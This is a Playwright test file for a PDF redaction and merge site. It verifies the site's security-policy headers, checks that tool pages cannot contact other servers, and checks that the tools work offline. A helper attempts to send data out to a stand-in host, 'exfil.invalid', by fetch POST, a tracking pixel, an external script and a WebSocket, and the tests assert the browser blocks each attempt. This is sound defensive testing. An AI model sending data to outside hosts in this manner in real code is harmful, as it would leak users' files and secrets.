// Browser tests for the promises made on /security/.
//
//  1. Every page loads cleanly under its security policy (_headers), with
//     nothing blocked and no request to any other server.
//  2. A tool page cannot send data out: the browser itself refuses.
//  3. The tools keep working with the network switched off.

const { test, before, after } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const { chromium } = require('playwright');
const { startServer, openPage, hasVendored, ROOT } = require('./helpers');

const FIXTURES = path.join(ROOT, 'tests/fixtures');
const STATEMENT = path.join(FIXTURES, 'statement-fake-redacted.pdf');
const PLAIN = path.join(FIXTURES, 'unlock/not-locked.pdf');
const RESTRICTED = path.join(FIXTURES, 'unlock/restricted-aes-256.pdf');

const sitemap = fs.readFileSync(path.join(ROOT, 'sitemap.xml'), 'utf8');
const PAGE_PATHS = [...sitemap.matchAll(/<loc>https:\/\/pdfmask\.co\.uk(\/[^<]*)<\/loc>/g)].map(m => m[1]);
// Pages that never fetch anything once loaded, and the two that load qpdf.
const NO_NETWORK = ['/redact-pdf/', '/redaction-checker/', '/merge-pdf/'];
const SAME_SITE_ONLY = ['/unlock-pdf/', '/remove-pdf-password/'];
const hasQpdf = hasVendored('@neslinesli93/qpdf-wasm', 'qpdf.wasm');
const needsQpdf = hasQpdf ? false : 'vendor/qpdf-wasm is missing: run "npm install && npm run build"';

let browser, server, baseUrl;

before(async () => {
    ({ server, url: baseUrl } = await startServer());
    browser = await chromium.launch();
});

after(async () => {
    if (browser) await browser.close();
    if (server) server.close();
});

const at = urlPath => baseUrl + urlPath.slice(1);

test('every page loads cleanly under its security policy', async () => {
    for (const urlPath of [...PAGE_PATHS, '/no-such-page']) {
        if (SAME_SITE_ONLY.includes(urlPath) && !hasQpdf) continue;
        const headers = (await fetch(at(urlPath))).headers;
        assert.match(headers.get('content-security-policy') || '', /default-src 'none'/, `${urlPath} has no security policy`);
        assert.equal(headers.get('x-content-type-options'), 'nosniff', urlPath);

        const { context, problems } = await openPage(browser, at(urlPath));
        // The 404 page is expected to log its own 404.
        const real = problems.filter(p => !(urlPath === '/no-such-page' && /404/.test(p)));
        assert.deepEqual(real, [], `${urlPath} had problems`);
        await context.close();
    }
});

// Try every ordinary way a page could send data to another server, and record
// what the security policy stopped. exfil.invalid can never resolve, so an
// attempt only counts as blocked when the browser reports a policy violation
// for it, not merely because the request failed.
function attemptToSendDataOut() {
    return new Promise(resolve => {
        const stopped = [];
        document.addEventListener('securitypolicyviolation', e => {
            stopped.push(`${e.effectiveDirective} ${e.blockedURI}`);
        });
        const attempts = [
            fetch('https://exfil.invalid/upload', { method: 'POST', body: 'secret', mode: 'no-cors' }).catch(() => {}),
            fetch('/robots.txt').then(() => stopped.push('same-site fetch allowed'), () => {}),
            new Promise(done => {
                const img = new Image();
                img.onload = img.onerror = done;
                img.src = 'https://exfil.invalid/pixel.gif?data=secret';
            }),
            new Promise(done => {
                const script = document.createElement('script');
                script.onload = script.onerror = done;
                script.src = 'https://exfil.invalid/collect.js';
                document.head.appendChild(script);
            }),
            new Promise(done => {
                try {
                    const socket = new WebSocket('wss://exfil.invalid/socket');
                    socket.onopen = socket.onerror = done;
                } catch (err) {
                    done();
                }
            })
        ];
        // Run from a timer so it executes as ordinary page code. (Code the test
        // harness runs directly is exempt from the eval restriction.)
        attempts.push(new Promise(done => setTimeout(() => {
            try {
                // eslint-disable-next-line no-eval
                eval('1 + 1');
                stopped.push('eval allowed');
            } catch (err) { /* blocked */ }
            done();
        }, 0)));
        const inline = document.createElement('script');
        inline.textContent = 'window.__inlineRan = true;';
        document.head.appendChild(inline);
        if (window.__inlineRan) stopped.push('inline script allowed');

        Promise.all(attempts).then(() => setTimeout(() => resolve(stopped), 300));
    });
}

for (const urlPath of [...NO_NETWORK, ...SAME_SITE_ONLY]) {
    test(`${urlPath} cannot send data to another server`, async () => {
        const context = await browser.newContext();
        const page = await context.newPage();
        await page.goto(at(urlPath), { waitUntil: 'load' });
        const stopped = await page.evaluate(attemptToSendDataOut);
        await context.close();

        const blocked = what => stopped.some(s => s.startsWith(what));
        assert.ok(blocked('connect-src https://exfil.invalid'), `fetch or WebSocket to another server was not blocked: ${stopped}`);
        assert.ok(blocked('connect-src wss://exfil.invalid'), `WebSocket was not blocked: ${stopped}`);
        assert.ok(blocked('img-src https://exfil.invalid'), `image request was not blocked: ${stopped}`);
        assert.ok(blocked('script-src-elem https://exfil.invalid'), `outside script was not blocked: ${stopped}`);
        assert.ok(blocked('script-src-elem inline'), `inline script was not blocked: ${stopped}`);
        assert.ok(blocked('script-src eval'), `eval was not blocked: ${stopped}`);
        assert.ok(!stopped.includes('eval allowed') && !stopped.includes('inline script allowed'), String(stopped));
        // Redact, Merge and the checker can't even talk to this site again.
        assert.equal(stopped.includes('same-site fetch allowed'), SAME_SITE_ONLY.includes(urlPath), `same-site fetch on ${urlPath}`);
    });
}

// ---------------------------------------------------------------------------
// Offline: load the page, cut the network, then use the tool.
// ---------------------------------------------------------------------------

async function openThenGoOffline(urlPath) {
    const opened = await openPage(browser, at(urlPath), { viewport: { width: 1280, height: 1800 }, acceptDownloads: true });
    // Give background workers a moment to finish starting, as a person would.
    await opened.page.waitForTimeout(1500);
    const requests = [];
    opened.context.on('request', r => {
        if (!/^(blob|data):/.test(r.url())) requests.push(new URL(r.url()).pathname);
    });
    await opened.context.setOffline(true);
    return { ...opened, requests };
}

async function download(page, click) {
    const [file] = await Promise.all([page.waitForEvent('download', { timeout: 60000 }), click()]);
    return fs.readFileSync(await file.path());
}

test('Redact works offline and makes no requests', async () => {
    const { page, context, problems, requests } = await openThenGoOffline('/redact-pdf/');
    await page.setInputFiles('#pdfFile', STATEMENT);
    await page.waitForFunction(() => document.getElementById('pageInfo').textContent.startsWith('Page 1 of'));
    const box = await page.locator('#selection-canvas').boundingBox();
    await page.mouse.move(box.x + box.width * 0.2, box.y + box.height * 0.2);
    await page.mouse.down();
    await page.mouse.move(box.x + box.width * 0.6, box.y + box.height * 0.3, { steps: 5 });
    await page.mouse.up();
    const output = await download(page, () => page.click('#applyBtn'));
    assert.equal(output.subarray(0, 5).toString(), '%PDF-');
    assert.deepEqual(requests, [], 'Redact made requests after the page had loaded');
    assert.deepEqual(problems, []);
    await context.close();
});

test('the Redaction checker works offline and makes no requests', async () => {
    const { page, context, problems, requests } = await openThenGoOffline('/redaction-checker/');
    await page.setInputFiles('#checkFile', STATEMENT);
    await page.waitForSelector('#checkResults .verdict', { timeout: 30000 });
    assert.match(await page.getAttribute('#checkResults .verdict', 'class'), /\bbad\b/);
    assert.deepEqual(requests, [], 'the checker made requests after the page had loaded');
    assert.deepEqual(problems, []);
    await context.close();
});

test('Merge works offline and makes no requests', async () => {
    const { page, context, problems, requests } = await openThenGoOffline('/merge-pdf/');
    await page.setInputFiles('#mergeFiles', [PLAIN, STATEMENT]);
    const output = await download(page, () => page.click('#mergeBtn'));
    assert.equal(output.subarray(0, 5).toString(), '%PDF-');
    assert.deepEqual(requests, [], 'Merge made requests after the page had loaded');
    assert.deepEqual(problems, []);
    await context.close();
});

test('Unlock works offline, reading only its own engine', { skip: needsQpdf }, async () => {
    const { page, context, problems, requests } = await openThenGoOffline('/unlock-pdf/');
    await page.setInputFiles('#unlockFile', RESTRICTED);
    await page.waitForFunction(() => /has restrictions/.test(document.getElementById('unlockStatus').textContent), null, { timeout: 60000 });
    const output = await download(page, () => page.click('#unlockBtn'));
    assert.equal(output.subarray(0, 5).toString(), '%PDF-');
    // The engine is re-read from the browser's cache for each run. Nothing else.
    assert.deepEqual([...new Set(requests)].filter(r => !r.endsWith('/qpdf.wasm')), []);
    assert.deepEqual(problems, []);
    await context.close();
});
